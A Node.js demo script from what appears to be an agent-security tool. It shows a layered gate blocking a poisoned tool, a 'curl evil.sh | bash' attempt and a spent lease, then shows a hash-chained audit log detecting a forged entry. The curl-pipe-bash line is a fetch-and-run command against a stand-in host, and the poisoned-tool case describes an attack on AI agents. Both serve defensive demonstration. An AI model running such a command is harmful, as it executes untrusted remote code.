/**
 * Own Your Stack — beat #4: the TAMPER-EVIDENT audit trail.   node demo/audit-demo.mjs
 *
 * demo.mjs shows the gate STOP a poisoned tool, a curl|bash, and a spent lease.
 * This shows the part you have to trust afterwards: the gate left ONE hash-chained
 * record of every layer's decision — and if anyone edits the on-disk log to hide
 * what happened, verification breaks and points at the exact entry.
 *
 * No new mechanism: it's warden's shipped audit chain (which keeper also reuses for
 * secret access), wired across the composed canon -> warden -> keeper gate.
 */
import fs from 'node:fs';
import { runTrilogy, verifyAuditFile, forgeEntry, findEntry, keeperAudit } from '../audit-trail.mjs';

const L = (s = '') => console.log(s);
const pad = (s, n) => (s + ' '.repeat(n)).slice(0, n);

L('\nOwn Your Stack — the composed gate, AUDITED  (vet → contain → key → PROVE)');
L('─'.repeat(72));

// Run the four beats through the audited gate (same scenario as demo.mjs).
const { audit, results, trailPath } = runTrilogy();

L('\nThe gate ran four calls. Each consulted layer recorded its decision:\n');
const verdict = { proceed: 'allowed', canon: 'STOPPED by canon', warden: 'STOPPED by warden', keeper: 'STOPPED by keeper' };
const scenario = {
  proceed: 'vetted tool · safe GET · valid lease',
  canon:   'POISONED tool (exfil instruction in its skill)',
  warden:  'vetted tool tries  curl evil.sh | bash',
  keeper:  'vetted tool · safe call · lease already spent',
};
for (const k of ['proceed', 'canon', 'warden', 'keeper']) {
  L('  ' + pad(scenario[k], 48) + '→ ' + verdict[k]);
}

// Persist the trail to disk, exactly as a daemon would (durable, append-only JSONL).
audit.flush(trailPath);
const lines = fs.readFileSync(trailPath, 'utf8').split('\n').filter((l) => l.trim());

L('\nThe trail on disk — ' + lines.length + ' chained entries, each sealing the one before:\n');
lines.forEach((l, i) => {
  const e = JSON.parse(l);
  const what = e.layer + '/' + e.decision + (e.tier ? ' (' + e.tier + ')' : '') + (e.reason ? ' (' + e.reason + ')' : '');
  L('  #' + i + '  ' + pad(what, 26) + ' hash ' + e.hash.slice(0, 12) + '…  ⟵ prev ' + e.prev.slice(0, 12) + '…');
});

// Verify the untouched chain.
const ok = verifyAuditFile(trailPath);
L('\n  verifyAuditFile() → ' + JSON.stringify(ok) + '   ✅ INTACT — every link checks out');

// Now an attacker who can write the log tries to HIDE the poisoned-tool block:
// rewrite canon's "block" entry to look like a "pass". The record changes; its
// stored hash does not — so the recomputed seal no longer matches.
const tamperAt = findEntry(trailPath, (e) => e.layer === 'canon' && e.decision === 'block');
L('\nAttacker rewrites entry #' + tamperAt + " (canon's block on the poisoned tool) to read 'pass'…");
forgeEntry(trailPath, tamperAt, { decision: 'pass', verdict: 'clean' });

const broken = verifyAuditFile(trailPath);
L('  verifyAuditFile() → ' + JSON.stringify(broken) + '   ❌ BROKEN — tamper detected at entry #' + broken.at);
L('\n  The edit is silent in the file but LOUD in the chain: you cannot rewrite history');
L('  without breaking the seal. (keeper protects its own secret-access log the same way,');
L('  with an additional HMAC tip — keeperAudit.verify(): ' + JSON.stringify(keeperAudit.verify()) + ')');

L('\nvet it · contain it · key it never holds · and PROVE every decision ✅\n');

// Make the demo self-checking: it must have actually demonstrated intact→broken.
if (!(results.proceed.ok && results.canon.by === 'canon' && results.warden.by === 'warden' && results.keeper.by === 'keeper')) {
  console.error('demo precondition failed: the four beats did not produce the expected verdicts');
  process.exit(1);
}
if (!ok.ok || broken.ok || broken.at !== tamperAt) {
  console.error('demo failed: the audit trail did not verify intact then break at the tampered entry');
  process.exit(1);
}
